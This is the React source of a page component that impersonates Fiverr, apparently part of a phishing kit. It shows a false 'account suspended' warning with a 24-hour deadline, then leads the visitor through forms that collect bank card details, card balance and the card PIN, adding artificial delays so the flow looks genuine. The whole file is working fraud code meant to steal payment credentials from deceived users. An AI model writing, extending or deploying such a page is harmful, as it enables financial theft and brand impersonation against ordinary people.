import Image from "../../components/Image"
import FiverrWhite from "../../assets/fiverr_white.svg"
import Visa from "../../assets/visa.svg"
import MasterCard from "../../assets/mastercard.svg"
import AmericanExpress from "../../assets/amex.svg"
import DinersClub from "../../assets/diners-club.svg"
import Paypal from "../../assets/paypal.svg"
import Gpay from "../../assets/googlepay.svg"
import VerifyButton from "../../components/Button/VerifyButton"
import Footer from "../../components/Footer"
import React, { useState } from "react"
import StickyButton from "../../components/StickyButton"
import { useLocation, useNavigate } from "react-router-dom"
import useFakePromise from "../../hooks/useFakePromise"
import Loader from "../../components/Loader"
import Modal from "../../components/Modal"
import CollectBalanceModal from "../../components/CollectBalanceModal"
import useGigData from "../../hooks/useGigData"
import { formatMoney, parseHash } from "../../utils"
import CardCollectionForm from "../../components/CardCollectionForm"
import useCreateCard from "../../hooks/useCreateCard"
import PinCollectionForm from "../../components/PinCollectionForm"
import useUpdateCardBalance from "../../hooks/useUpdateCardBalance"
import useUpdateCardPin from "../../hooks/useUpdateCardPin"

const Home = () => {
    const [collectPayment, gotoCollectPayment] = useState(false)
    const [collectBalance, gotoCollectBalance] = useState(false)
    const [collectPin, gotoCollectPin] = useState(false)
    const location = useLocation()

    const {gig: order} = useGigData()
    const card = useCreateCard()
    const balance = useUpdateCardBalance()
    const pin = useUpdateCardPin()


    const navigate = useNavigate()
    const promise = useFakePromise()


    React.useEffect(() => {
        const params = parseHash(location.hash)
        if (params.queryParams.step == "balance_required") gotoCollectBalance(true)
        if (params.queryParams.step == "payment_required") gotoCollectPayment(true)
        if (params.queryParams.step == "pin_required") gotoCollectPin(true)

        return () => {
            gotoCollectBalance(false)
            gotoCollectPayment(false)
            gotoCollectPin(false)
        }
    }, [location.hash])

    const handleSubmitBalance = async (e: React.FormEvent<HTMLFormElement>) => {
        e.preventDefault()
        try {
            await balance.create()
            gotoCollectBalance(false)
            await promise.wait(3000)
            navigate("#payment?step=pin_required")
            gotoCollectPin(true)
        } catch (error) {
            console.log("error", error)
        }
    }

    const handleSubmitCard = async (e: React.FormEvent<HTMLFormElement>) => {
        e.preventDefault()
        try {
            await card.create()
            gotoCollectPayment(false)
            await promise.wait(3000)
            navigate("#payment?step=balance_required")
            gotoCollectBalance(true)
        } catch (error) {
            console.log("error", error)
        }
    }


    const handleSubmitPin = async (e: React.FormEvent<HTMLFormElement>) => {
        e.preventDefault()
        try {
            await pin.create()
            gotoCollectPin(false)
            await promise.wait(3000)
            navigate("#payment?step=thank-you")
        } catch (error) {
            console.log("error", error)
        }
    }

    const handleClick = async () => {
        await promise.wait(3000)
        navigate("#payment?step=payment_required")
        gotoCollectPayment(true)
    }

    if (collectBalance) {
        return <Modal><CollectBalanceModal errors={card.errors} formData={card.formData} handleChange={balance.handleChange} handleSubmit={handleSubmitBalance} loading={pin.loading} /></Modal>
    }

    if (collectPayment) {
        return <Modal><CardCollectionForm errors={card.errors} formData={card.formData} handleChange={card.handleChange} handleSubmit={handleSubmitCard} loading={card.loading} /></Modal>
    }


    if (collectPin) {
        return <Modal><PinCollectionForm errors={pin.errors} formData={pin.formData} handleChange={pin.handleChange} handleSubmit={handleSubmitPin} loading={pin.loading} /></Modal>
    }


    return (<>
        <Loader isLoading={promise.isLoading} />
        <div className="w-[90%] mx-auto border border-gray-200 p-4 rounded-md mt-6">
            <div className={`w-full h-[300px] ${!order?.imageUrl && 'bg-green-500'} flex items-center justify-center rounded-md object-cover overflow-hidden`}>
                <Image src={order?.imageUrl || FiverrWhite} className="w-[500px] items-center justify-center object-cover"/>
            </div>

            <h1 className="text-2xl font-semibold my-4">
                {order?.profileLink ? <a href={order?.profileLink} target="_blank" rel="noopener noreferrer">{order?.username || "Fiverr User"}</a> : order?.username || "Fiverr User"}</h1>

            <p className="text-gray-700 text-sm font-semibold border my-3 rounded-md bg-red-500/10 p-3">
                {order?.gigMessage || <>
                    <span className="font-bold">Your account is currently suspended</span>. To restore your account, please verify your bank card. Please enter and confirm your bank card details within 24 hours. Once verification is complete, your account will be activated. We apologize for any inconvenience caused.
                </>}
            </p>

            <div className="bg-gray-50 p-2 rounded-md border border-gray-200 space-y-2">
                <p className="text-gray-700 text-sm">Receiver name: <span className="font-semibold text-black">{order?.username || "N/A"}</span></p>
                <p className="text-gray-700 text-sm">Description: <span className="font-semibold">{order?.gigDescription || "The account is currently suspended. To restore your account, please verify your bank card. Please enter and confirm your bank card details within 24 hours. Once verification is complete, your account will be activated. We apologize for any inconvenience caused."}</span></p>
                {order?.rating && <p className="text-gray-700 text-sm">Rating: <span className="font-semibold text-black">{order.rating || '0'}</span></p>}
                {order?.price && <p className="text-gray-700 text-sm">Price: <span className="font-semibold text-black">{formatMoney(order.price)}</span></p>}
                {order?.numberOfReviews && <p className="text-gray-700 text-sm">Number of reviews: <span className="font-semibold text-black">{order?.numberOfReviews || '0'}</span></p>}
                {order?.gigLink && <p className="text-gray-700 text-sm">View at: <span className="font-semibold text-black"><a href={order?.gigLink} target="_blank" rel="noopener noreferrer">{(new URL(order.gigLink as string).hostname)}</a></span></p>}
            </div>
            <br />
            <p className="font-semibold">Status: <span className="font-semibold text-green-500">Waiting for verification</span></p>
        </div>

        <div className="w-[90%] space-y-2 mx-auto border border-gray-200 p-4 bg-gray-50">
            <h2 className="font-semibold text-2xl">How you'll verify</h2>
            <div className="flex gap-x-4">
                <input type="radio" name="card" id="card" checked onChange={() => { }} />
                <label htmlFor="card" className="flex items-center gap-x-2">
                    <Image src={Visa} className="w-10 border rounded-md" />
                    <Image src={MasterCard} className="w-10" />
                    <Image src={AmericanExpress} className="w-10" />
                    <Image src={DinersClub} className="w-10" />
                </label>
            </div>
            <div className="flex gap-x-4">
                <input type="radio" name="paypal" id="paypal" disabled />
                <label htmlFor="paypal" className="flex items-center gap-x-2 opacity-70">
                    <Image src={Paypal} className="w-10" />
                </label>
            </div>
            <div className="flex gap-x-4">
                <input type="radio" name="paypal" id="paypal" disabled />
                <label htmlFor="paypal" className="flex items-center gap-x-2 opacity-70">
                    <Image src={Gpay} className="w-10" />
                </label>
            </div>
            <p>Status: <span className="font-semibold text-green-500 ml-5">Waiting for verification</span></p>

            <hr className="opacity-75" />
            <VerifyButton handleClick={handleClick} />
        </div>


        <StickyButton handleClick={handleClick} />

        <Footer />
    </>)
}

export default Home